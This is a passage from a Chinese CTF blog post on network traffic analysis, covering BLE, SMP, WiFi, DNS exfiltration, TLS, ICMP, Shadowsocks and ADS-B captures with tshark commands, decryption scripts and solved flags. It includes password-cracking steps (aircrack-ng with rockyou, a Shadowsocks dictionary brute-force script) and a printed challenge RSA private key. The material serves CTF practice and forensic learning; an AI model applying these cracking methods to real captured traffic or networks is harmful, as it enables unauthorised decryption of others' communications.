<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先用tshark导出公钥，并把公钥另存为pub.key</span><br>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_rx -Y <span class="hljs-string">&#x27;btatt.opcode == 0x1b&#x27;</span> | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> | <span class="hljs-built_in">uniq</span> &gt; data.txt<br><span class="hljs-comment"># 然后用tshark导出密文，这里的数据如果不是十六进制，用tshark提有时候会出问题，可以手提</span><br>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y <span class="hljs-string">&#x27;btatt.opcode == 0x12&#x27;</span> | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> | <span class="hljs-built_in">uniq</span> &gt; enc.txt<br><span class="hljs-comment"># 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了，这里的密文后面如果有多余\x00，可以用010手动去除，要不然可能解密失败</span><br>python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc.txt<br></code></pre></td></tr></table></figure>

<p><img src="/imgs/image-20241202135717254.png" srcset="/img/loading.gif" lazyload></p>
<p>例题2-BLE_crypto</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 先用tshark导出公钥，并把公钥另存为pub.key，这里如果是十六进制，需要CyberChef转换一下先</span><br>tshark -r BLE_crypto.pcapng -T fields -e btatt.value -Y <span class="hljs-string">&#x27;btatt.opcode&#x27;</span> | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span><br><span class="hljs-comment"># 然后用tshark导出密文，如果是十六进制，需要CyberChef转换一下先</span><br>tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y <span class="hljs-string">&#x27;btatt.opcode == 0x12&#x27;</span> | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> | <span class="hljs-built_in">uniq</span> &gt; enc.txt<br><span class="hljs-comment"># 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了</span><br>python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc<br></code></pre></td></tr></table></figure>

<p><img src="/imgs/image-20241202140503314.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>手动解析RSA公钥，并爆破生成私钥：</strong></p>
<ol>
<li>解析公钥: <code>openssl rsa -in pub.key -text -inform PEM -pubin</code></li>
</ol>
<p><img src="/imgs/image-20250226232852559.png" srcset="/img/loading.gif" lazyload></p>
<ol start="2">
<li>十六进制转十进制并分解n</li>
</ol>
<p><img src="/imgs/image-20250226233215942.png" srcset="/img/loading.gif" lazyload></p>
<ol start="3">
<li>使用 rsatool.py 导出私钥 priv.key</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python rsatool.py -p 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527 -q 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221 -e 65537<br></code></pre></td></tr></table></figure>

<p><img src="/imgs/image-20250226233503658.png" srcset="/img/loading.gif" lazyload></p>
<ol start="4">
<li>使用私钥来解密密文</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl rsautl -decrypt -raw -inkey priv.key -<span class="hljs-keyword">in</span> flag<br>openssl pkeyutl -decrypt -<span class="hljs-keyword">in</span> flag -out decrypted_flag -inkey priv.key<br></code></pre></td></tr></table></figure>

<h3 id="SMP协议"><a href="#SMP协议" class="headerlink" title="SMP协议"></a>SMP协议</h3><p>SMP协议的全称是Secure Manager Protocol，用来定义蓝牙的配对和密钥的分发</p>
<p>配对完成后传输的数据是加密的，我们需要用(Crakle)[<a target="_blank" rel="noopener" href="https://github.com/mikeryan/crackle]%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">https://github.com/mikeryan/crackle]这个项目进行解密</a></p>
<blockquote>
<p>这里老版本的可能有点问题，建议去pr中找一下新版的安装</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2159878">https://cloud.tencent.com/developer/article/2159878</a></p>
</blockquote>
<p>安装好项目后直接运行一下命令解密流量包即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o dec.pcapng<br></code></pre></td></tr></table></figure>

<p><img src="/imgs/image-20241202141020218.png" srcset="/img/loading.gif" lazyload></p>
<p>SMP协议解密完成后，我们可以在ATT协议中发现传输的数据，用以下命令导出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r dec.pcapng -T fields -e btatt.value -Y <span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span> | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span><br></code></pre></td></tr></table></figure>

<p>然后CyberChef将得到的十六进制数据转换一下即可得到flag：<code>flag&#123;9ba3973652c0ee073652c0ee0c76ca6cb36441bd40&#125;</code></p>
<h2 id="邮件-STMP-流量分析"><a href="#邮件-STMP-流量分析" class="headerlink" title="邮件(STMP)流量分析"></a>邮件(STMP)流量分析</h2><p>可以试试看导出对象-导出IMF-导出文件的后缀是eml（可以使用网易邮箱大师打开）</p>
<p>eml文件是将数据base64编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍</p>
<h2 id="无线流量分析"><a href="#无线流量分析" class="headerlink" title="无线流量分析"></a>无线流量分析</h2><p>在kali中用弱口令密码爆破出WIFI密码</p>
<p>执行命令：<code>aircrack-ng ctf.pcap -w rockyou.txt</code></p>
<p>执行命令解码：<code>airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap</code></p>
<p>然后打开解码后的文件，查找flag</p>
<h2 id="DNS流量分析"><a href="#DNS流量分析" class="headerlink" title="DNS流量分析"></a>DNS流量分析</h2><h3 id="DNSlog外带的流量"><a href="#DNSlog外带的流量" class="headerlink" title="DNSlog外带的流量"></a>DNSlog外带的流量</h3><p><img src="/imgs/image-20241120165643159.png" srcset="/img/loading.gif" lazyload></p>
<p>直接使用tshark导出DNS外带的数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r 1.pcap -T fields -e dns.qry.name -Y <span class="hljs-string">&#x27; ip.dst == 8.8.8.8 &amp;&amp; dns.qry.type == 1&#x27;</span> | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> | <span class="hljs-built_in">uniq</span> &gt; data.txt<br></code></pre></td></tr></table></figure>

<p>例题1-攻防世界 MISC - tunnel</p>
<h3 id="数据以二进制藏在DNS各种解析记录中"><a href="#数据以二进制藏在DNS各种解析记录中" class="headerlink" title="数据以二进制藏在DNS各种解析记录中"></a>数据以二进制藏在DNS各种解析记录中</h3><p>这种情况下有时候需要分IP导出数据</p>
<blockquote>
<p>DNS记录类型，常用的有：</p>
<p>A：A记录，指向别名或IPv4地址。</p>
<p>AAAA：IPv6地址解析。</p>
<p>NS：解析服务器记录。</p>
<p>MX：邮件交换记录。</p>
<p>CNAME：别名。</p>
<p>txt：为某个主机名或域名设置的说明。</p>
<p>PTR：指针记录，PTR记录是A记录的逆向记录。</p>
<p>SOA：标记一个区的开始，起始授权机构记录</p>
</blockquote>
<p>例题1-2024国赛-Toug_DNS</p>
<h3 id="信息以二进制藏在端口号末尾中"><a href="#信息以二进制藏在端口号末尾中" class="headerlink" title="信息以二进制藏在端口号末尾中"></a>信息以二进制藏在端口号末尾中</h3><h2 id="SLL、TLS加密流量分析"><a href="#SLL、TLS加密流量分析" class="headerlink" title="SLL、TLS加密流量分析"></a>SLL、TLS加密流量分析</h2><blockquote>
<p>老版本的 wireshark 中显示的是 SSL，新版本的改成TLS了</p>
</blockquote>
<p>解密方法就是点击 编辑 -&gt; 首选项 -&gt; Protocols -&gt; TLS <code>加载 RSA 私钥</code> 或者 <code>加载日志文件((Pre)-Master-Secret log)</code></p>
<p>解完密后就和平常的流量分析一样了</p>
<p>例题1-BUU 第九章TLS流量分析</p>
<p>打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了</p>
<p>翻看流量包，追踪 TCP 流，发现流7中POST了一个 sslkey.log 日志文件</p>
<p><img src="/imgs/N7.png" srcset="/img/loading.gif" lazyload></p>
<p>导出 sslkey.log 日志文件，然后按上面的步骤导入解密</p>
<p><img src="/imgs/N8.png" srcset="/img/loading.gif" lazyload></p>
<p>解密完后直接搜索 flag{ 字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}</p>
<p><img src="/imgs/N9.png" srcset="/img/loading.gif" lazyload></p>
<p>例题-DDCTF2018 流量分析</p>
<p>直接在 TLS 加载 RSA 私钥解密即可</p>
<p>私钥的格式如下：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">-----BEGIN RSA PRIVATE KEY-----<br>MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O<span class="hljs-operator">+</span>mIQiOUQCvN0HYbj8153JfSQ<br>LsJIhbRYS7<span class="hljs-operator">+</span>zZ1oXvPemWQDv<span class="hljs-symbol">/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br>vMX<span class="hljs-symbol">/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br>AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4<span class="hljs-symbol">/y4</span><br>QGfzYqOn8<span class="hljs-operator">+</span>Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp<span class="hljs-symbol">/</span><br>QbRcZ<span class="hljs-symbol">/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br>czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd<span class="hljs-operator">+</span>F13GBCOQ<br>ZCM4prBjAkEAz<span class="hljs-operator">+</span>ENahsEjBE4<span class="hljs-operator">+</span><span class="hljs-number">7</span>H1HdIaw0<span class="hljs-operator">+</span>goe<span class="hljs-symbol">/45d6A2ewO/lYH6dDZTAzTW9z9</span><br>kzV8uz<span class="hljs-operator">+</span>Mmo5163<span class="hljs-symbol">/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="hljs-operator">+</span><span class="hljs-number">04</span>eTWQCmH3haeQ<span class="hljs-symbol">/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br>AnbJ4Z6opJCGu<span class="hljs-operator">+</span>UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ<span class="hljs-operator">+</span>HLJ1<span class="hljs-symbol">/wH</span><br><span class="hljs-symbol">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="hljs-number">2</span>STT5qZWzQFz8NRe<span class="hljs-operator">+</span><span class="hljs-operator">/</span>otNOHBR2Xk4e8IS<span class="hljs-operator">+</span>ehIJ3TvyE<span class="hljs-operator">=</span><br><span class="hljs-operator">-</span>----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure>

<p>例题2-2024铁三初赛 流量分析</p>
<h2 id="ICMP流量分析"><a href="#ICMP流量分析" class="headerlink" title="ICMP流量分析"></a>ICMP流量分析</h2><p>flag 可能藏在每一帧的长度中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r 1.pcapng -Y <span class="hljs-string">&quot;icmp&quot;</span> -T fields -e frame.len | <span class="hljs-built_in">uniq</span> &gt; data.txt<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read().split()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(item)-<span class="hljs-number">42</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<p>例题1-第三届“百越杯”福建省高校网络空间安全大赛-要想会，先学会</p>
<h2 id="VPN流量分析"><a href="#VPN流量分析" class="headerlink" title="VPN流量分析"></a>VPN流量分析</h2><h3 id="Shadowsocks流量分析"><a href="#Shadowsocks流量分析" class="headerlink" title="Shadowsocks流量分析"></a>Shadowsocks流量分析</h3><p>例题-2023强网杯-谍影重重3.0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#请求解密脚本</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">EVP_BytesToKey</span>(<span class="hljs-params">password, key_len, iv_len</span>):<br>    m = []<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;&#x27;</span>.join(m)) &lt; (key_len + iv_len):<br>        md5 = hashlib.md5()<br>        data = password<br>        <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">0</span>:<br>            data = m[i - <span class="hljs-number">1</span>] + password<br>        md5.update(data)<br>        m.append(md5.digest())<br>        i += <span class="hljs-number">1</span><br>    ms = <span class="hljs-string">b&#x27;&#x27;</span>.join(m)<br>    key = ms[:key_len]<br>    iv = ms[key_len:key_len + iv_len]<br>    <span class="hljs-keyword">return</span> key, iv<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher, password</span>):<br>    key_len = <span class="hljs-built_in">int</span>(<span class="hljs-number">256</span>/<span class="hljs-number">8</span>)<br>    iv_len = <span class="hljs-number">16</span><br>    mode = AES.MODE_CFB<br>    key, _ = EVP_BytesToKey(password, key_len, iv_len)<br>    cipher = <span class="hljs-built_in">bytes</span>.fromhex(cipher)<br>    iv = cipher[:iv_len]<br>    real_cipher = cipher[iv_len:]<br>    obj = AES.new(key, mode, iv, segment_size=<span class="hljs-number">128</span>)<br>    plain = obj.decrypt(real_cipher)<br>    <span class="hljs-keyword">return</span> plain<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>cipher = <span class="hljs-string">&#x27;e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206&#x27;</span><br>    <span class="hljs-comment"># 因为password未知，所以我们这里尝试用字典进行爆破</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rockyou.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br>    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> lines:<br>        plain = decrypt(cipher, password.strip())<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;HTTP&#x27;</span> <span class="hljs-keyword">in</span> plain:<br>            <span class="hljs-built_in">print</span>(password.decode(), plain.decode())<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<h3 id="VMess-V2ray-流量分析"><a href="#VMess-V2ray-流量分析" class="headerlink" title="VMess(V2ray)流量分析"></a>VMess(V2ray)流量分析</h3><h4 id="VMessMD5"><a href="#VMessMD5" class="headerlink" title="VMessMD5"></a>VMessMD5</h4><p>【例题：2022强网杯-谍影重重】</p>
<h4 id="VMessAEAD"><a href="#VMessAEAD" class="headerlink" title="VMessAEAD"></a>VMessAEAD</h4><p>【例题：2024 DubheCTF-authenticated mess &amp; unauthenticated less】</p>
<h2 id="ADS-B流量分析"><a href="#ADS-B流量分析" class="headerlink" title="ADS-B流量分析"></a>ADS-B流量分析</h2><p>飞机&#x2F;航空器流量，找到流量数据，用pyModeS模块分析即可</p>
<p>例题</p>
<p><strong>[2023 强网杯] 谍影重重2.0</strong></p>
<p>下载附件得到一个只有TCP流量的流量包<br>题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE<br>问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块<br>在参考链接：<a target="_blank" rel="noopener" href="https://gitee.com/wangmin-gf/ads-b">https://gitee.com/wangmin-gf/ads-b</a> 看到了与tcp.payload中相似的数据<br>使用tshark提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可</p>
<p>tshark -r attach.pcapng -T fields -e “tcp.payload” | sed ‘&#x2F;^\s*$&#x2F;d’ &gt; tshark.txt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyModeS<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tshark.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># print(item.strip())</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(item.strip()) != <span class="hljs-number">46</span>:<br>            <span class="hljs-keyword">continue</span><br>        res = pyModeS.tell(item.strip()[<span class="hljs-number">18</span>:<span class="hljs-number">46</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;===========================================================================&quot;</span>)<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">===========================================================================<br>                     Message: 8d79a05e990ccda6f80886dd9544<br>                ICAO address: 79a05e<br>             Downlink Format: 17<br>                    Protocol: Mode-S Extended Squitter (ADS-B)<br>                        Type: Airborne velocity<br>                       Speed: 371 knots<br>                       Track: 213.3474959459136 degrees<br>               Vertical rate: -64 feet/minute<br>                        Type: Ground speed<br>===========================================================================<br></code></pre></td></tr></table></figure>

<h2 id="OICQ协议-QQ协议"><a href="#OICQ协议-QQ协议" class="headerlink" title="OICQ协议(QQ协议)"></a>OICQ协议(QQ协议)</h2><p><img src="/imgs/image-20250302192720139.png" srcset="/img/loading.gif" lazyload></p>
<p>可以分析得到QQ号</p>
<h2 id="损坏的流量包分析"><a href="#损坏的流量包分析" class="headerlink" title="损坏的流量包分析"></a>损坏的流量包分析</h2><p>例题-第一届“百度杯”信息安全攻防总决赛 find the flag（flag藏在 frame29-41 的 ip.id 字段中）</p>
<p>打开流量包后发现有如下的报错</p>
<p><img src="/imgs/N10.png" srcset="/img/loading.gif" lazyload></p>
<p>可以直接使用 <a target="_blank" rel="noopener" href="https://f00l.de/hacking/pcapfix.php">在线网站</a> 修复</p>
<p>修复完成以后就是正常的流量分析了</p>
<h2 id="从流量包中找异常流量"><a href="#从流量包中找异常流量" class="headerlink" title="从流量包中找异常流量"></a>从流量包中找异常流量</h2><p>一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数，<br>然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。</p>
<hr>
<blockquote>
<p>作者: <a target="_blank" rel="noopener" href="https://goodlunatic.github.io/">Lunatic</a><br>URL: <a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/5422d65/">https://goodlunatic.github.io/posts/5422d65/</a>  </p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/misc/" class="category-chain-item">misc</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="print-no-link">#流量分析</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>流量分析基础</div>
      <div>http://example.com/2025/01/19/MISC/流量分析/流量分析/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>chaye</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>January 19, 2025</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B5%81%E9%87%8F/" title="虚拟机流量">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">虚拟机流量</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/01/19/MISC/%E7%BC%96%E7%A0%81/01%E7%BC%96%E7%A0%81/" title="01编码">
                        <span class="hidden-mobile">01编码</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
